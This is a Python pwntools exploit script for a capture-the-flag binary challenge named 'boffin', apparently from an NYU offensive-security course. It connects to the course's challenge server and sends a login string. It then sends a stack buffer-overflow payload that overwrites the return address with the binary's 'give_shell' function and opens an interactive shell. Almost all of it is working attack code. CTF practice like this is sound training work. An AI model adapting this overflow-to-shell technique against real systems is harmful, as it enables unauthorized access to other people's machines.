from pwn import *
import sys
import time

e = ELF('./boffin')

sh = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1337)

#gdb.attach(sh, '''
#set follow-fork-mode child
#break *0x00400714
#break *0x004006a6
#continue
#''')

print(sh.recvline(timeout=1))
sh.sendline('tk1931')

p = ('A' * (int(sys.argv[1]) - 1)) + chr(0) + str(p64(0x400720)) + str(p64(e.symbols['give_shell']))[:6]


#print(len(str(p64(e.symbols['give_shell']))[:7]))

time.sleep(5)

print(sh.recvline())

sh.sendline(p)

sh.interactive()


print("continue")
if (sh.poll(block=True) != 0) :
	print("fail")
else :
	print("Yay!")

sh.close()
